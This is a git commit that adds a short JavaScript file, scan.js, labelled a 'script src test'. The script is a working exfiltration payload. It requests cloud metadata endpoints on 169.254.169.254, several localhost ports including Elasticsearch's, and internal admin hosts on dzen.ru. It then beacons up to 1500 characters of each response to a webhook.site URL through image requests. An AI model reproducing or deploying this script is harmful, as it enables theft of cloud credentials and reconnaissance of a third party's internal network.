a4b63cfee9d937ce65eec4eafc07fa7ce8cc0c39
wetakush <fooderg@gmail.com>
2026-07-18 21:22:42 +0300

    Add scan.js for script src test

---
+++ scan.js
@@ -0,0 +1,14 @@
+var wh="https://webhook.site/f34e1577-b464-45fc-a799-9d5f31086476";
+function x(l,d){new Image().src=wh+"/s-"+l+"?d="+encodeURIComponent(d.substring(0,1500));}
+var t=[
+["meta","http://169.254.169.254/computeMetadata/v1/?recursive=true"],
+["aws","http://169.254.169.254/latest/meta-data/"],
+["lo80","http://localhost/"],
+["lo8080","http://localhost:8080/"],
+["lo9200","http://localhost:9200/"],
+["vhadm","http://vh-admin.dzen.ru/"],
+["lkpo","http://lkpo.dzen.ru/"]
+];
+t.forEach(function(e){
+fetch(e[1],{mode:"no-cors"}).then(function(r){return r.text().catch(function(){return "s:"+r.status});}).then(function(b){x(e[0],b);}).catch(function(err){x(e[0]+"-e",err.message);});
+});
